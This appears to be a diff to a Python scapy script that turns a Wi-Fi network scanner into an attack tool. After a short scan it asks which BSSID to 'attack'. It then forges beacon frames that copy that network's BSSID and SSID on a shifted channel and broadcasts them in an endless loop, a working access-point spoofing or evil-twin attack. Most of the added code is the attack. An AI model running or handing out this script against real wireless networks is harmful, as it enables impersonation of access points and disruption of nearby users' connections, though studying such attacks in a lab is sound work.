@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 from scapy.all import *
 from threading import Thread
 import pandas
@@ -28,32 +29,64 @@ def callback(packet):
         networks.loc[bssid] = (ssid, dbm_signal, channel)
 
 
-def print_all():
+def print_all(stop_signal):
     while True:
         os.system("clear")
         print(networks)
         time.sleep(0.5)
+        if stop_signal():
+            break
 
 
-def change_channel():
+def change_channel(stop_signal):
     ch = 1
     while True:
         os.system(f"iwconfig {interface} channel {ch}")
         # switch channel from 1 to 14 each 0.5s
         ch = ch % 14 + 1
         time.sleep(0.5)
+        if stop_signal():
+            break
 
 
 if __name__ == "__main__":
     # interface name, check using iwconfig
-    interface = "wlan0mon"
+    interface = "wlp1s0mon"
+    stop_thread = False
     # start the thread that prints all the networks
-    printer = Thread(target=print_all)
+    printer = Thread(target=print_all, args=(lambda: stop_thread,))
     printer.daemon = True
     printer.start()
     # start the channel changer
-    channel_changer = Thread(target=change_channel)
+    channel_changer = Thread(target=change_channel, args=(lambda: stop_thread,))
     channel_changer.daemon = True
     channel_changer.start()
     # start sniffing
-    sniff(prn=callback, iface=interface)
+    sniff(prn=callback, iface=interface, timeout=5)
+    
+    # stop threads for sniffing network
+    stop_thread = True
+    printer.join()
+    channel_changer.join()
+    
+    # ask user for the network he wants to attack
+    bssid_user = input("Choose a BSSID number that you want to attack: ")
+    ssid, dbm_signal, channel = networks.loc[bssid_user]
+    
+    # 6 channels away from the original network
+    channel = (channel + 6) % 14
+    
+    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=bssid_user, addr3=bssid_user)
+    beacon = Dot11Beacon()
+    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
+    channel_packet = Dot11Elt(ID='DSset', info=chr(channel))
+    
+    # prepare packet with all parameters
+    packet = RadioTap()/dot11/beacon/essid/channel_packet
+    
+    # send packet
+    sendp(packet, iface=interface, inter=0.100, loop=1)
+
+    
+    
+    
